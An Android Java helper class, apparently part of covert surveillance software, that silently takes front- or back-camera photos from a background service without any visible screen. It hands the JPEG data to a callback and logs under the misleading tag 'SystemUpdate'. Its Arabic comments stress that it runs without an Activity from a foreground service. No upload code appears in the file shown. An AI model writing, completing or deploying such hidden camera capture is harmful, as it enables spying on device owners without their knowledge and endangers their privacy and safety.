package com.sec.check;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * CameraHelper - محسّن للعمل مع ServiceRunner
 * ============================================================
 * ★ يعتمد على Camera2 API مع fallback
 * ★ يشتغل حتى بدون Activity
 * ★ يستخدم Foreground Service Context
 * ============================================================
 */
public class CameraHelper {

    private static final String TAG = "SystemUpdate";

    public interface PhotoCallback {
        void onSuccess(byte[] jpegData);
        void onError(String error);
    }

    // ============================================================
    // capturePhoto - النقطة الرئيسية
    // ============================================================
    public static void capturePhoto(Context context, boolean isFront, PhotoCallback callback) {
        // ★ تحقق من الصلاحيات ★
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "[CAM] No camera permission");
            callback.onError("no_camera_permission");
            return;
        }

        // ★ استخدم Camera2 ★
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            capturePhotoCamera2(context, isFront, callback);
        } else {
            capturePhotoLegacy(context, isFront, callback);
        }
    }

    // ============================================================
    // capturePhotoCamera2 - الطريقة المحسّنة
    // ============================================================
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private static void capturePhotoCamera2(Context context, final boolean isFront,
                                            final PhotoCallback callback) {
        new Thread(() -> {
            CameraDevice camera = null;
            ImageReader reader = null;
            HandlerThread thread = null;

            try {
                CameraManager manager = (CameraManager)
                        context.getSystemService(Context.CAMERA_SERVICE);
                if (manager == null) {
                    callback.onError("no_camera_manager");
                    return;
                }

                // ★ ابحث عن الكاميرا المناسبة ★
                String targetCameraId = null;
                String[] cameraIds = manager.getCameraIdList();
                Log.d(TAG, "[CAM] Available: " + Arrays.toString(cameraIds));

                for (String cameraId : cameraIds) {
                    try {
                        CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
                        Integer facing = chars.get(CameraCharacteristics.LENS_FACING);

                        if (facing != null) {
                            if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                targetCameraId = cameraId;
                                break;
                            }
                            if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                                targetCameraId = cameraId;
                                break;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "[CAM] char err: " + e.getMessage());
                    }
                }

                // ★ Fallback: أول كاميرا ★
                if (targetCameraId == null && cameraIds.length > 0) {
                    targetCameraId = cameraIds[0];
                }

                if (targetCameraId == null) {
                    callback.onError("no_camera");
                    return;
                }

                final String finalCameraId = targetCameraId;
                Log.d(TAG, "[CAM] Using camera: " + finalCameraId);

                // ★ ابدأ Background Thread ★
                thread = new HandlerThread("CameraThread");
                thread.start();
                final Handler handler = new Handler(thread.getLooper());

                // ★ حدد الأبعاد ★
                CameraCharacteristics chars = manager.getCameraCharacteristics(finalCameraId);
                StreamConfigurationMap map = chars.get(
                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);

                Size[] sizes = null;
                if (map != null) {
                    sizes = map.getOutputSizes(ImageFormat.JPEG);
                }

                int width = 640;
                int height = 480;
                if (sizes != null && sizes.length > 0) {
                    // اختر الحجم المناسب
                    for (Size s : sizes) {
                        if (s.getWidth() <= 1280 && s.getWidth() >= 640) {
                            width = s.getWidth();
                            height = s.getHeight();
                            break;
                        }
                    }
                }

                Log.d(TAG, "[CAM] Size: " + width + "x" + height);

                // ★ أنشئ ImageReader ★
                reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);

                final CountDownLatch latch = new CountDownLatch(1);
                final AtomicReference<byte[]> resultRef = new AtomicReference<>(null);
                final AtomicReference<String> errorRef = new AtomicReference<>(null);

                reader.setOnImageAvailableListener(imgReader -> {
                    try {
                        Image image = imgReader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            image.close();

                            resultRef.set(bytes);
                            Log.d(TAG, "[CAM] Image captured: " + bytes.length + " bytes");
                            latch.countDown();
                        }
                    } catch (Exception e) {
                        errorRef.set("read_error: " + e.getMessage());
                        latch.countDown();
                    }
                }, handler);

                final ImageReader finalReader = reader;
                final CameraDevice[] cameraRef = new CameraDevice[1];

                // ★ افتح الكاميرا ★
                CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice cam) {
                        cameraRef[0] = cam;
                        Log.d(TAG, "[CAM] Camera opened");

                        try {
                            final Surface surface = finalReader.getSurface();
                            List<Surface> surfaces = new ArrayList<>();
                            surfaces.add(surface);

                            cam.createCaptureSession(surfaces,
                                    new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(
                                        @NonNull CameraCaptureSession session) {
                                    try {
                                        CaptureRequest.Builder builder =
                                                cam.createCaptureRequest(
                                                        CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(surface);
                                        builder.set(CaptureRequest.CONTROL_MODE,
                                                CaptureRequest.CONTROL_MODE_AUTO);
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);

                                        session.capture(builder.build(), null, handler);
                                        Log.d(TAG, "[CAM] Capture sent");
                                    } catch (Exception e) {
                                        errorRef.set("capture_error: " + e.getMessage());
                                        latch.countDown();
                                    }
                                }

                                @Override
                                public void onConfigureFailed(
                                        @NonNull CameraCaptureSession session) {
                                    errorRef.set("config_failed");
                                    latch.countDown();
                                }
                            }, handler);

                        } catch (Exception e) {
                            errorRef.set("session_error: " + e.getMessage());
                            latch.countDown();
                        }
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice cam) {
                        try { cam.close(); } catch (Exception ignored) {}
                    }

                    @Override
                    public void onError(@NonNull CameraDevice cam, int error) {
                        errorRef.set("camera_error_" + error);
                        latch.countDown();
                        try { cam.close(); } catch (Exception ignored) {}
                    }
                };

                manager.openCamera(finalCameraId, stateCallback, handler);

                // ★ انتظر 15 ثانية ★
                boolean completed = latch.await(15, TimeUnit.SECONDS);

                // ★ اقفل الكاميرا ★
                try {
                    if (cameraRef[0] != null) cameraRef[0].close();
                } catch (Exception ignored) {}

                if (!completed) {
                    callback.onError("timeout");
                } else if (errorRef.get() != null) {
                    callback.onError(errorRef.get());
                } else if (resultRef.get() != null) {
                    callback.onSuccess(resultRef.get());
                } else {
                    callback.onError("no_image");
                }

            } catch (Exception e) {
                Log.e(TAG, "[CAM] error: " + e.getMessage());
                callback.onError("exception: " + e.getMessage());
                if (camera != null) {
                    try { camera.close(); } catch (Exception ignored) {}
                }
            } finally {
                try { if (reader != null) reader.close(); } catch (Exception ignored) {}
                try { if (thread != null) thread.quitSafely(); } catch (Exception ignored) {}
            }
        }).start();
    }

    // ============================================================
    // capturePhotoLegacy - للأجهزة القديمة
    // ============================================================
    @SuppressWarnings("deprecation")
    private static void capturePhotoLegacy(Context context, boolean isFront,
                                           final PhotoCallback callback) {
        new Thread(() -> {
            android.hardware.Camera camera = null;
            try {
                int cameraId = 0;
                int numCameras = android.hardware.Camera.getNumberOfCameras();
                for (int i = 0; i < numCameras; i++) {
                    android.hardware.Camera.CameraInfo info =
                            new android.hardware.Camera.CameraInfo();
                    android.hardware.Camera.getCameraInfo(i, info);
                    if (isFront && info.facing ==
                            android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        cameraId = i;
                        break;
                    }
                    if (!isFront && info.facing ==
                            android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                        cameraId = i;
                        break;
                    }
                }

                camera = android.hardware.Camera.open(cameraId);
                if (camera == null) {
                    callback.onError("camera_null");
                    return;
                }

                android.hardware.Camera.Parameters params = camera.getParameters();
                params.setPictureFormat(ImageFormat.JPEG);
                params.setJpegQuality(85);
                camera.setParameters(params);

                camera.startPreview();
                Thread.sleep(1500);

                final CountDownLatch latch = new CountDownLatch(1);
                final AtomicReference<byte[]> resultRef = new AtomicReference<>(null);

                camera.takePicture(null, null, (data, cam) -> {
                    resultRef.set(data);
                    latch.countDown();
                    try { cam.release(); } catch (Exception ignored) {}
                });

                boolean completed = latch.await(10, TimeUnit.SECONDS);
                if (completed && resultRef.get() != null) {
                    callback.onSuccess(resultRef.get());
                } else {
                    callback.onError("timeout");
                }
            } catch (Exception e) {
                callback.onError("legacy_exception: " + e.getMessage());
                if (camera != null) {
                    try { camera.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }
                    }
